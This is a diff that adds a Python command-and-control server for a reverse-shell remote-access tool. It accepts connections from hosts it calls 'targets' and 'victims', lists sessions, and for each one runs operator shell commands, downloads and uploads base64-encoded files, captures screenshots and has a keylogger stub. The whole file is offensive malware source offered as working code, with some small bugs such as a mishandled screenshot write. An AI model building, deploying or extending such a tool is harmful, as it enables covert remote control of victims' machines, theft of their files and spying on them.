@@ -1,0 +1,148 @@
+import socket
+import json
+import os
+import base64
+import threading
+
+# SERVER_ADDRESS = "192.168.1.128"
+SERVER_ADDRESS = "10.177.186.2"
+
+SERVER_PORT = 54321
+global s
+ips = []
+targets = []
+clients = 0
+stop_threads = False
+
+
+
+def shell(target, ip):
+    print(f"shell aici......{str(target)}, {ip}")
+    def reliable_send(data):
+        """Send data to the client reliably by encoding to JSON."""
+        try:
+            json_data = json.dumps(data)
+            json_data = json_data.encode('utf-8')
+            target.send(json_data)
+        except Exception as e:
+            print("Error while send message to victim", e)
+
+    def reliable_recv():
+        """Receive data from the client reliably by decoding from JSON."""
+        try:
+
+            # print("reliable_recv()")
+            data = ""
+            while True:
+                try:
+                    # print("while True")
+                    chunk_recv = target.recv(1024).decode()
+                    # print("chunk_recv = ", str(chunk_recv))
+                    if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
+                        # print("not chunk_recv or len(chunk_recv)")
+                        break
+                    data = data + chunk_recv
+                    # print("data.decode('utf-8') = ", data)
+
+                    return json.loads(data)
+                except ValueError:
+                    continue
+
+
+        except Exception as e:
+            print("Eroare în timpul primirii datelor de la client:", e)
+            return None
+    global count
+    while True:
+        command = input("* Shell#-%s: " % str(ip))
+        reliable_send(command)
+
+        if command == 'q':
+            break
+        elif command == "exit":
+            target.close()
+            targets.remove(target)
+            ips.remove(ip)
+            break
+        elif command.strip().startswith("cd") and len(command.strip()) > 2:
+            continue
+        elif command[:8] == "download": #DOWNLOAD FROM TARGET TO SERVER
+            with open(command[9:], "wb") as file:
+                file_data = reliable_recv()
+                file.write(base64.b64decode(file_data))
+        elif command[:6] == "upload":
+            try:
+                with open(command[7:], "rb") as fin:
+                    reliable_send(base64.b64encode(fin.read()))
+            except ValueError:
+                failed = "Failed to upload"
+                reliable_send(base64.b64encode(failed))
+
+        elif command[:10] == "screenshot":
+            with open("screenshot_%d.png" % count, 'wb') as ss:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image).decode()
+                if image_decoded[:4] == "[!!]":
+                    print(image_decoded)
+                else:
+                    ss.write(image_decoded)
+                    count += 1
+        elif command[:12] == "keylog_start":
+            continue
+        else:
+            result = reliable_recv()
+            print("REZULTAT VENIT DE LA VICTIMA: ", result)
+
+def server():
+    global clients
+    while True:
+        if stop_threads is True:
+            break
+        s.settimeout(1)
+        try:
+            target, ip = s.accept()
+            targets.append(target)
+            ips.append(ip)
+            print("[Connected now] :", str(targets[clients]), " -- ", str(ips[clients]))
+            clients += 1
+        except Exception as e:
+            pass
+
+
+
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((SERVER_ADDRESS, SERVER_PORT))
+s.listen(5)
+
+print("[+] Waiting for targets to connect ... ")
+listening_thread  = threading.Thread(target = server)
+listening_thread.start()
+
+while True:
+    command = input("* Center: ")
+    if command == "targets":
+        count = 0
+        for ip in ips:
+            print(f"Session {count} <--> {ip}")
+            count += 1
+    elif command[:7] == "session":
+        try:
+            num = int(command[8:])
+            tarnum = targets[num]
+            tarip = ips[num]
+            print(f"tarnum{tarnum}, tarip{tarip}")
+            shell(tarnum, tarip)
+
+        except Exception as e:
+            print("[!!] No session under that number.")
+
+    elif command == "exit":
+        for target in targets:
+            target.close()
+        s.close()
+        stop_threads = True
+        listening_thread.join()
+        break
